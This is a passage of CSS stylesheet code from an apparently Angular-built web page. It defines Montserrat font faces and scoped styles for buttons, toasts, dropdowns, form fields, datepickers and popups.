            font-weight: 200;
            font-style: italic;
            src: url(.assets/.css/Montserrat-ExtraLightItalic.3b26932636b21dcbc04d.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 300;
            font-style: normal;
            src: url(.assets/.css/Montserrat-Light.d4a8834fa8f57f0929b9.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 300;
            font-style: italic;
            src: url(.assets/.css/Montserrat-LightItalic.fad9ab039c3de5ab6b85.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 400;
            font-style: normal;
            src: url(.assets/.css/Montserrat-Regular.92db9a0772b3732e6d68.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 400;
            font-style: italic;
            src: url(.assets/.css/Montserrat-Italic.3fcbdb4c29e43e3a5691.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 500;
            font-style: normal;
            src: url(.assets/.css/Montserrat-Medium.d815b0a29adf3450c55f.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 500;
            font-style: italic;
            src: url(.assets/.css/Montserrat-MediumItalic.f15ca5fe6efcb2893541.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 600;
            font-style: normal;
            src: url(.assets/.css/Montserrat-SemiBold.bb3740d350b0186ce32b.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 600;
            font-style: italic;
            src: url(.assets/.css/Montserrat-SemiBoldItalic.eee96022889810e6ff89.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 700;
            font-style: normal;
            src: url(.assets/.css/Montserrat-Bold.9c71d42b6a840ecfda8f.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 700;
            font-style: italic;
            src: url(.assets/.css/Montserrat-BoldItalic.81f56370a912bac75d5a.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 800;
            font-style: normal;
            src: url(.assets/.css/Montserrat-ExtraBold.433ac418a603294fc589.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 800;
            font-style: italic;
            src: url(.assets/.css/Montserrat-ExtraBoldItalic.965b7ea0f52031a9d292.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 900;
            font-style: normal;
            src: url(.assets/.css/Montserrat-Black.561246a3549d3b797b4b.otf) format("opentype")
        }

        @font-face {
            font-family: Montserrat;
            font-weight: 900;
            font-style: italic;
            src: url(.assets/.css/Montserrat-BlackItalic.3da12a02bb360cd21abc.otf) format("opentype")
        }

        button[_ngcontent-gtc-c2],
        input[_ngcontent-gtc-c2],
        select[_ngcontent-gtc-c2],
        textarea[_ngcontent-gtc-c2] {
            font-family: Montserrat
        }

        h1[_ngcontent-gtc-c2],
        h2[_ngcontent-gtc-c2],
        h3[_ngcontent-gtc-c2],
        h4[_ngcontent-gtc-c2],
        h5[_ngcontent-gtc-c2],
        h6[_ngcontent-gtc-c2] {
            font-weight: 700;
            margin-top: 0;
            margin-bottom: 8px
        }

        [_ngcontent-gtc-c2]::-webkit-scrollbar {
            width: 10px
        }

        [_ngcontent-gtc-c2]::-webkit-scrollbar-track {
            background-color: transparent
        }

        [_ngcontent-gtc-c2]::-webkit-scrollbar-thumb {
            background-color: rgba(105, 112, 126, .3);
            border-radius: 4px
        }

        [_ngcontent-gtc-c2]::-webkit-scrollbar-thumb:hover {
            background-color: #69707e
        }

        input[_ngcontent-gtc-c2],
        textarea[_ngcontent-gtc-c2] {
            width: 100%;
            border-radius: 4px;
            border: 1px solid #6a707d;
            background-color: rgba(106, 112, 125, .19);
            font-size: 16px;
            line-height: 1.5;
            color: #69707e;
            font-weight: 400;
            padding: 8px 16px
        }

        input[_ngcontent-gtc-c2]:valid,
        textarea[_ngcontent-gtc-c2]:valid {
            color: #fff
        }

        input[_ngcontent-gtc-c2]:focus,
        textarea[_ngcontent-gtc-c2]:focus {
            outline: 0
        }

        input.custom[_ngcontent-gtc-c2],
        textarea.custom[_ngcontent-gtc-c2] {
            font-size: 16px;
            padding: 0;
            background-color: transparent;
            border: none;
            border-bottom: 1px solid #383a42;
            border-radius: 0;
            transition: all .25s ease-in-out
        }

        input.custom[_ngcontent-gtc-c2]:focus,
        textarea.custom[_ngcontent-gtc-c2]:focus {
            border-color: #fff
        }

        button[_ngcontent-gtc-c2] {
            text-align: center;
            font-size: 14px;
            font-weight: 700;
            color: #fff;
            padding: 8px;
            background-color: transparent;
            border-radius: 3px;
            border: 1px solid #fff;
            transition: all .15s ease;
            cursor: pointer
        }

        button[_ngcontent-gtc-c2]:hover {
            background-color: rgba(255, 255, 255, .1)
        }

        button[_ngcontent-gtc-c2]:disabled {
            cursor: default;
            border: none;
            background-color: #464b56 !important;
            color: rgba(255, 255, 255, .5)
        }

        button[_ngcontent-gtc-c2]:focus {
            outline: 0
        }

        button.primary[_ngcontent-gtc-c2] {
            background-color: #d0021b;
            border: none
        }

        button.primary[_ngcontent-gtc-c2]:hover {
            background-color: #ff1e3a
        }

        label[_ngcontent-gtc-c2],
        small[_ngcontent-gtc-c2] {
            font-weight: 400;
            display: block;
            margin: 0
        }

        a[_ngcontent-gtc-c2] {
            color: #41c2ff;
            text-decoration: none
        }

        a[_ngcontent-gtc-c2]:hover {
            color: #00a3f0;
            text-decoration: underline
        }

        .toast[_ngcontent-gtc-c2] {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            font-size: 16px;
            color: #fff;
            font-family: Montserrat;
            line-height: normal;
            position: fixed;
            top: 16px;
            right: 16px;
            overflow-y: auto;
            overflow-x: hidden;
            max-height: calc(100vh - 32px);
            z-index: 9999
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] {
            position: relative;
            background-color: #1d1f23;
            width: 324px;
            padding: 18px;
            margin-bottom: 8px;
            word-break: break-word;
            border: 1px solid #383a42;
            border-radius: 4px;
            box-shadow: 0 4px 8px 0 rgba(0, 0, 0, .23)
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] .close[_ngcontent-gtc-c2] {
            position: absolute;
            top: 6px;
            right: 6px;
            width: 18px;
            height: 18px;
            fill: #b3b2b2;
            cursor: pointer;
            transition: .15s ease-in-out
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] .close[_ngcontent-gtc-c2]:hover {
            fill: #fff
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] main[_ngcontent-gtc-c2] {
            white-space: pre-wrap
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] footer[_ngcontent-gtc-c2] {
            border-top: 1px solid #383a42;
            margin-top: 8px;
            padding-top: 8px
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] footer[_ngcontent-gtc-c2] .toggler[_ngcontent-gtc-c2] {
            display: flex;
            align-items: baseline;
            color: #41c2ff;
            font-size: 12px;
            transition: .15s ease-in-out;
            cursor: pointer
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] footer[_ngcontent-gtc-c2] .toggler.active[_ngcontent-gtc-c2] {
            margin-bottom: 8px
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] footer[_ngcontent-gtc-c2] .toggler.active[_ngcontent-gtc-c2] svg[_ngcontent-gtc-c2] {
            transform: rotate(90deg)
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] footer[_ngcontent-gtc-c2] .toggler[_ngcontent-gtc-c2] svg[_ngcontent-gtc-c2] {
            width: 10px;
            height: 10px;
            fill: #41c2ff;
            margin-right: 4px;
            transition: .15s ease-in-out
        }

        .toast[_ngcontent-gtc-c2] .content[_ngcontent-gtc-c2] footer[_ngcontent-gtc-c2] .detail[_ngcontent-gtc-c2] {
            height: 0;
            font-size: 14px;
            white-space: pre-wrap;
            overflow: hidden;
            transition: .15s ease-in-out
        }
    </style>
    <style>
        .justify-content-left[_ngcontent-gtc-c3] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c3] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c3] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c3] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c3] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c3] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c3] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c3] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c3] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c3] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c3] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c3] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c3] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c3] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c3] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c3] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c3] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c3] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c3] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c3] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c3] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c3] button.mat-icon-button[_ngcontent-gtc-c3] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c3] button.mat-icon-button[_ngcontent-gtc-c3] span.mat-button-wrapper[_ngcontent-gtc-c3],
        .mat-datepicker-toggle[_ngcontent-gtc-c3] button.mat-icon-button[_ngcontent-gtc-c3] span.mat-button-wrapper[_ngcontent-gtc-c3] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c3] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c3] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c3] i.fa-caret-down[_ngcontent-gtc-c3] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c3] input[type=text][_ngcontent-gtc-c3] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c3] .cust-option[_ngcontent-gtc-c3] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c3] .cust-option.active[_ngcontent-gtc-c3] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c3] .cust-option[_ngcontent-gtc-c3] ul.option-list[_ngcontent-gtc-c3] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c3] .cust-option[_ngcontent-gtc-c3] ul.option-list[_ngcontent-gtc-c3] li[_ngcontent-gtc-c3] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c3] .cust-option[_ngcontent-gtc-c3] ul.option-list[_ngcontent-gtc-c3] li[_ngcontent-gtc-c3] label[_ngcontent-gtc-c3] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c3] .cust-option[_ngcontent-gtc-c3] ul.option-list[_ngcontent-gtc-c3] li[_ngcontent-gtc-c3] label[_ngcontent-gtc-c3]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c3] .cust-option[_ngcontent-gtc-c3] ul.option-list[_ngcontent-gtc-c3] li[_ngcontent-gtc-c3] label[_ngcontent-gtc-c3]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c3] .cust-option[_ngcontent-gtc-c3] ul.option-list[_ngcontent-gtc-c3] li[_ngcontent-gtc-c3] input[type=radio][_ngcontent-gtc-c3] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c3] .cust-option[_ngcontent-gtc-c3] ul.option-list[_ngcontent-gtc-c3] li[_ngcontent-gtc-c3] input[type=radio][_ngcontent-gtc-c3]:checked+label[_ngcontent-gtc-c3]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c3] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c3] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c3],
        label[_ngcontent-gtc-c3],
        ol[_ngcontent-gtc-c3] li[_ngcontent-gtc-c3],
        table[_ngcontent-gtc-c3] td[_ngcontent-gtc-c3],
        table[_ngcontent-gtc-c3] th[_ngcontent-gtc-c3],
        ul[_ngcontent-gtc-c3] li[_ngcontent-gtc-c3] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c3] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c3],
        h2[_ngcontent-gtc-c3],
        h3[_ngcontent-gtc-c3],
        h4[_ngcontent-gtc-c3],
        h5[_ngcontent-gtc-c3],
        h6[_ngcontent-gtc-c3],
        p[_ngcontent-gtc-c3],
        span[_ngcontent-gtc-c3] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c3] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c3],
        textarea[_ngcontent-gtc-c3] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c3] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c3] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c3] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c3] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c3] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c3] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c3] span[_ngcontent-gtc-c3] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c3] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c3] p.close-circle[_ngcontent-gtc-c3] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c3] p.close-circle[_ngcontent-gtc-c3] span[_ngcontent-gtc-c3] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c3] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c3] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c3] span[_ngcontent-gtc-c3] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c3] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c3] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c3] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c3] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c3] span[_ngcontent-gtc-c3] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c3] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c3] span[_ngcontent-gtc-c3] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control[_ngcontent-gtc-c3] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c3] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c3] {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c3] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c3] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c3]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c3]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c3]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c3] span[_ngcontent-gtc-c3] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c3] h4[_ngcontent-gtc-c3] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3],
            .header-text-small[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c3] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c3] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c3] {
            float: left
        }

        .fright[_ngcontent-gtc-c3] {
            float: right
        }

        .row[_ngcontent-gtc-c3] .padding-left-0[_ngcontent-gtc-c3] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c3] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c3] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c3] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c3] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c3]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c3] .shuffle-container[_ngcontent-gtc-c3] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c3] .shuffle-container[_ngcontent-gtc-c3]>.row[_ngcontent-gtc-c3] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c3] .shuffle-container[_ngcontent-gtc-c3] .shuffle-pop-table[_ngcontent-gtc-c3] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c3] .shuffle-container[_ngcontent-gtc-c3] .shuffle-pop-table[_ngcontent-gtc-c3] .shuffle-pop-item[_ngcontent-gtc-c3] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c3] .shuffle-container[_ngcontent-gtc-c3] .shuffle-pop-table[_ngcontent-gtc-c3] .shuffle-pop-item.img[_ngcontent-gtc-c3] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c3] .shuffle-container[_ngcontent-gtc-c3] img[_ngcontent-gtc-c3] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c3] .shuffle-container[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c3] .shuffle-container[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] strong[_ngcontent-gtc-c3] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c3] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c3] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c3]>.mat-calendar-body-cell-content[_ngcontent-gtc-c3]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c3],
        .mat-calendar-table-header[_ngcontent-gtc-c3] th[_ngcontent-gtc-c3],
        .mat-datepicker-content[_ngcontent-gtc-c3] .mat-calendar-next-button[_ngcontent-gtc-c3],
        .mat-datepicker-content[_ngcontent-gtc-c3] .mat-calendar-previous-button[_ngcontent-gtc-c3],
        .mat-datepicker-toggle[_ngcontent-gtc-c3],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c3] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c3] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c3] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c3] .mat-calendar-body-active[_ngcontent-gtc-c3]>.mat-calendar-body-cell-content[_ngcontent-gtc-c3]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c3] .mat-calendar-body-active[_ngcontent-gtc-c3]>.mat-calendar-body-cell-content[_ngcontent-gtc-c3]:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell[_ngcontent-gtc-c3]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c3]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c3]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c3] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c3] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary[_ngcontent-gtc-c3] .mat-option.mat-selected[_ngcontent-gtc-c3]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c3] .mat-option[_ngcontent-gtc-c3] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c3] div[_ngcontent-gtc-c3],
        .ngx-editor-textarea[_ngcontent-gtc-c3] section[_ngcontent-gtc-c3] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c3] div[_ngcontent-gtc-c3] img[_ngcontent-gtc-c3],
        .ngx-editor-textarea[_ngcontent-gtc-c3] section[_ngcontent-gtc-c3] img[_ngcontent-gtc-c3] {
            width: 100% !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c3] a[_ngcontent-gtc-c3] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c3] *[_ngcontent-gtc-c3] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c3] b[_ngcontent-gtc-c3] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c3] b[_ngcontent-gtc-c3] *[_ngcontent-gtc-c3] {
            font-family: Montserrat-Bold !important;
